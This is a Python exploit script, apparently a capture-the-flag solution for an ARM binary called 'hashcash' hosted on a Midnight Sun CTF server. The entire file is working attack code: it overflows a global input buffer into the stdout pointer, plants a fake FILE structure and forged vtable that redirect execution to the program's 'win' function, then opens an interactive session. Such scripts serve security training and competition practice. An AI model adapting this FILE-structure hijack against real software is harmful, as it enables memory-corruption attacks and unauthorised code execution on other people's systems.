#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './hashcash'
context(os = 'linux', arch = 'arm')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi'.split()+[bin_file]}, \
                        local   = {'argv':'qemu-arm-static -L /usr/arm-linux-gnueabi'.split()+[bin_file]}, \
                        remote  = {'host':'pwn2.midnightsunctf.se', 'port':24680})
env.select()

#==========

binf = ELF(bin_file)
addr_input          = binf.symbols['input']
addr_stdout         = binf.symbols['stdout']
addr_win            = binf.sep_function['win']

#==========

def attack(conn):
    lock  = p32(0)
    lock += p32(0)
    lock += p32(0xf666c000)

    vtable  = '\x00'*0x1c
    vtable += p32(addr_win)

    fake_stdout  = '\x00'*0x48
    fake_stdout += p32(addr_input + 0x10)
    fake_stdout  = fake_stdout.ljust(0x98, '\x00')
    fake_stdout += p32(addr_input + 0x10 + len(lock))

    exploit  = 'a'*0xf
    exploit += lock
    exploit += vtable
    exploit += fake_stdout
    exploit  = exploit.ljust(addr_stdout - addr_input - 1, '\x00')
    exploit += p32(addr_input + 0x10 + len(lock+vtable))
    conn.sendlineafter('input:', exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
